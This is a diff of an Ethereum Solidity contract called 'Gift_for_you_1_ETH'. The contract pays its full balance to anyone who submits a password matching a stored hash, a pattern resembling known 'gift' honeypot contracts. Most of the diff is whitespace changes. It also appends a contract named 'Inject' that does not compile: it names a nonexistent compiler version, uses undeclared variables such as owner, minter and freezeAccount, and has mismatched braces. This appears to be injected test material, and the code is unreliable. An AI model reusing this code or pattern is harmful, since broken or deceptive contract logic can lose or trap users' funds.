@@ -3,13 +3,13 @@ pragma solidity ^0.4.18;
 contract Gift_for_you_1_ETH
 {
     bool passHasBeenSet = false;
-    
+
     function()payable{}
-    
+
     function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
-    
+
     bytes32 public hashPass;
-    
+
     function SetPass(bytes32 hash)
     public
     payable
@@ -19,7 +19,7 @@ contract Gift_for_you_1_ETH
             hashPass = hash;
         }
     }
-    
+
     function GetGift(bytes pass)
     public
     payable
@@ -29,7 +29,7 @@ contract Gift_for_you_1_ETH
             msg.sender.transfer(this.balance);
         }
     }
-    
+
     function PassHasBeenSet(bytes32 hash)
     public
     {
@@ -38,4 +38,15 @@ contract Gift_for_you_1_ETH
            passHasBeenSet=true;
         }
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
